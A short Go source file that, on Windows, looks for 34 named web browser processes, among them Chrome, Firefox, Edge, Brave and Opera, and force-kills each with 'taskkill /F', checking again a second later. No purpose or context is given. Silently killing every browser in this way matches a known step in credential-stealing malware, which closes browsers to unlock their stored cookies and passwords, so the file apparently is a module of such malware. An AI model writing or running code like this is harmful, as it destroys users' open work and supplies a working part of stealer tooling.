package processkill

import (
	"os/exec"
	"strings"
	"time"
)

func seqStop(processName string) {
	cmd := exec.Command("cmd", "/C", "taskkill", "/F", "/IM", processName+".exe")
	cmd.Run()
}

func procCheck(processName string) bool {
	cmd := exec.Command("cmd", "/C", "tasklist", "/FI", "IMAGENAME eq "+processName+".exe")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), processName+".exe")
}

func recheck(processName string) {
	seqStop(processName)
	time.Sleep(1 * time.Second)
	if procCheck(processName) {
		seqStop(processName)
	}
}

func Run() {
	browserProcesses := []string{
		"360chrome", "360se", "avant", "brave", "chrome", "chromium", "citrio",
		"comodo_dragon", "coolnovo", "coowon", "cyberfox", "deepnet", "dooble",
		"epic", "firefox", "iceweasel", "iridium", "k-meleon", "maxthon",
		"msedge", "netscape", "opera", "palemoon", "safari", "seamonkey",
		"sleipnir", "sputnik", "torch", "ucbrowser", "vivaldi", "waterfox",
		"yandex", "yandexbrowser", "operagx",
	}

	for _, processName := range browserProcesses {
		if procCheck(processName) {
			recheck(processName)
		}
	}
}
